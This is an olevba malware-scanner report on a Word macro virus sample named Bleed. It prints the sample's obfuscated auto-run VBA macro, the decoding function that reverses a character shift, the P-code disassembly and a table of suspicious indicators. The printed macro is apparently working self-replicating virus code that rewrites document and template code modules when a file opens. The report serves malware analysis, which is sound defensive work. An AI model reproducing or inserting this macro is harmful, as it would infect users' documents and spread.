olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bleed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bleed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim jacky(17) As String
jacky(1) = "l‹=b��Œ�=o‚�’Š‚=k‚•‘W=p‚‘=Š~€Œ=Z=j~€�Œ`Œ‹‘~†‹‚�"
jacky(2) = "l�‘†Œ‹�Kp~“‚kŒ�Š~‰m�ŒŠ�‘=Z=Eo‹�=G=MFW=p‚‘^‘‘�=kŒ�Š~‰q‚Š�‰~‘‚Kc’‰‰k~Š‚I=“kŒ�Š~‰"
jacky(3) = "p‚‘=“�=Z=Š~€ŒKs_m�Œ‡‚€‘W=l�‘†Œ‹�Ks†�’�m�Œ‘‚€‘†Œ‹=Z=Eo‹�=G=MF"
jacky(4) = "p‚‘=“€=Z=“�Ks_`ŒŠ�Œ‹‚‹‘�ENFW=p‚‘=€ŒŠŒ=Z=“€K`Œ�‚jŒ�’‰‚"
jacky(5) = "p‚‘=…Œ�‘=Z=kŒ�Š~‰q‚Š�‰~‘‚W=“€Œ�‚=Z=€ŒŠŒK‰†‹‚�ENI=OUF=C=“`�=C=?b‹�=p’?"
jacky(6) = "fƒ=Š~€Œ=Z=…Œ�‘=q…‚‹=p‚‘=…Œ�‘=Z=^€‘†“‚aŒ€’Š‚‹‘"
jacky(7) = "p‚‘=‹‚”…Œ�‘=Z=…Œ�‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚"
jacky(8) = "fƒ=‹‚”…Œ�‘K‰†‹‚�ENI=NF=Y[=?m�†“~‘‚=p’=aŒ€’Š‚‹‘|l�‚‹EF?=q…‚‹"
jacky(9) = "‹‚”…Œ�‘Ka‚‰‚‘‚i†‹‚�=NI=‹‚”…Œ�‘K€Œ’‹‘Œƒ‰†‹‚�"
jacky(10) = "‹‚”…Œ�‘K~��ƒ�ŒŠ�‘�†‹„=“€Œ�‚"
jacky(11) = "…Œ�‘Kp~“‚"
jacky(12) = "b‹�=fƒ"
jacky(13) = "fƒ=a~–EkŒ”EFF=Z=Ef‹‘Eo‹�=G=NRF=H=NF=q…‚‹"
jacky(14) = "j�„_Œ•=?f=Š~ˆ‚=?=C=^��‰†€~‘†Œ‹Kr�‚�k~Š‚=C=?=‰‚‚�>?I=MI=?`‰~��K‰‚‚�=™=‡~€ˆ=‘”Œƒ‰Œ”‚�=L=i†‹‚w‚�M=L=j‚‘~�…~�‚?"
jacky(15) = "b‹�=fƒ"
jacky(16) = "q…†�aŒ€’Š‚‹‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚Ka‚‰‚‘‚i†‹‚�=OVI=NU"
jacky(17) = "fƒ=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚�=Z=c~‰�‚=q…‚‹=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚"
For i = 1 To 17: vc = vc & encrypt(jacky(i)): Next i
ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 29, vc
bleed
End Sub
Private Function encrypt(c As String)
For x = 1 To Len(c): A = Asc(Mid(c, x, 1)): Ch = A - 29: NC = NC & Chr(Ch): Next
encrypt = NC & vbCr
End Function
Private Sub bleed()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bleed
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4139 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0011 
' 	VarDefn jacky (As String)
' Line #2:
' 	LitStr 0x002F "l‹=b��Œ�=o‚�’Š‚=k‚•‘W=p‚‘=Š~€Œ=Z=j~€�Œ`Œ‹‘~†‹‚�"
' 	LitDI2 0x0001 
' 	ArgsSt jacky 0x0001 
' Line #3:
' 	LitStr 0x004F "l�‘†Œ‹�Kp~“‚kŒ�Š~‰m�ŒŠ�‘=Z=Eo‹�=G=MFW=p‚‘^‘‘�=kŒ�Š~‰q‚Š�‰~‘‚Kc’‰‰k~Š‚I=“kŒ�Š~‰"
' 	LitDI2 0x0002 
' 	ArgsSt jacky 0x0001 
' Line #4:
' 	LitStr 0x003D "p‚‘=“�=Z=Š~€ŒKs_m�Œ‡‚€‘W=l�‘†Œ‹�Ks†�’�m�Œ‘‚€‘†Œ‹=Z=Eo‹�=G=MF"
' 	LitDI2 0x0003 
' 	ArgsSt jacky 0x0001 
' Line #5:
' 	LitStr 0x0038 "p‚‘=“€=Z=“�Ks_`ŒŠ�Œ‹‚‹‘�ENFW=p‚‘=€ŒŠŒ=Z=“€K`Œ�‚jŒ�’‰‚"
' 	LitDI2 0x0004 
' 	ArgsSt jacky 0x0001 
' Line #6:
' 	LitStr 0x0047 "p‚‘=…Œ�‘=Z=kŒ�Š~‰q‚Š�‰~‘‚W=“€Œ�‚=Z=€ŒŠŒK‰†‹‚�ENI=OUF=C=“`�=C=?b‹�=p’?"
' 	LitDI2 0x0005 
' 	ArgsSt jacky 0x0001 
' Line #7:
' 	LitStr 0x002D "fƒ=Š~€Œ=Z=…Œ�‘=q…‚‹=p‚‘=…Œ�‘=Z=^€‘†“‚aŒ€’Š‚‹‘"
' 	LitDI2 0x0006 
' 	ArgsSt jacky 0x0001 
' Line #8:
' 	LitStr 0x0037 "p‚‘=‹‚”…Œ�‘=Z=…Œ�‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚"
' 	LitDI2 0x0007 
' 	ArgsSt jacky 0x0001 
' Line #9:
' 	LitStr 0x003C "fƒ=‹‚”…Œ�‘K‰†‹‚�ENI=NF=Y[=?m�†“~‘‚=p’=aŒ€’Š‚‹‘|l�‚‹EF?=q…‚‹"
' 	LitDI2 0x0008 
' 	ArgsSt jacky 0x0001 
' Line #10:
' 	LitStr 0x002B "‹‚”…Œ�‘Ka‚‰‚‘‚i†‹‚�=NI=‹‚”…Œ�‘K€Œ’‹‘Œƒ‰†‹‚�"
' 	LitDI2 0x0009 
' 	ArgsSt jacky 0x0001 
' Line #11:
' 	LitStr 0x001B "‹‚”…Œ�‘K~��ƒ�ŒŠ�‘�†‹„=“€Œ�‚"
' 	LitDI2 0x000A 
' 	ArgsSt jacky 0x0001 
' Line #12:
' 	LitStr 0x0009 "…Œ�‘Kp~“‚"
' 	LitDI2 0x000B 
' 	ArgsSt jacky 0x0001 
' Line #13:
' 	LitStr 0x0006 "b‹�=fƒ"
' 	LitDI2 0x000C 
' 	ArgsSt jacky 0x0001 
' Line #14:
' 	LitStr 0x0028 "fƒ=a~–EkŒ”EFF=Z=Ef‹‘Eo‹�=G=NRF=H=NF=q…‚‹"
' 	LitDI2 0x000D 
' 	ArgsSt jacky 0x0001 
' Line #15:
' 	LitStr 0x006D "j�„_Œ•=?f=Š~ˆ‚=?=C=^��‰†€~‘†Œ‹Kr�‚�k~Š‚=C=?=‰‚‚�>?I=MI=?`‰~��K‰‚‚�=™=‡~€ˆ=‘”Œƒ‰Œ”‚�=L=i†‹‚w‚�M=L=j‚‘~�…~�‚?"
' 	LitDI2 0x000E 
' 	ArgsSt jacky 0x0001 
' Line #16:
' 	LitStr 0x0006 "b‹�=fƒ"
' 	LitDI2 0x000F 
' 	ArgsSt jacky 0x0001 
' Line #17:
' 	LitStr 0x0044 "q…†�aŒ€’Š‚‹‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�ENFK`Œ�‚jŒ�’‰‚Ka‚‰‚‘‚i†‹‚�=OVI=NU"
' 	LitDI2 0x0010 
' 	ArgsSt jacky 0x0001 
' Line #18:
' 	LitStr 0x0038 "fƒ=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚�=Z=c~‰�‚=q…‚‹=^€‘†“‚aŒ€’Š‚‹‘Kp~“‚"
' 	LitDI2 0x0011 
' 	ArgsSt jacky 0x0001 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0011 
' 	For 
' 	BoS 0x0000 
' 	Ld vc 
' 	Ld i 
' 	ArgsLd jacky 0x0001 
' 	ArgsLd encrypt 0x0001 
' 	Concat 
' 	St vc 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	LitDI2 0x001D 
' 	Ld vc 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' 	ArgsCall bleed 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Function encrypt(c As String, id_FFFE As Variant))
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld c 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St A 
' 	BoS 0x0000 
' 	Ld A 
' 	LitDI2 0x001D 
' 	Sub 
' 	St Ch 
' 	BoS 0x0000 
' 	Ld NC 
' 	Ld Ch 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NC 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #25:
' 	Ld NC 
' 	Ld vbCr 
' 	Concat 
' 	St encrypt 
' Line #26:
' 	EndFunc 
' Line #27:
' 	FuncDefn (Private Sub bleed())
' Line #28:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

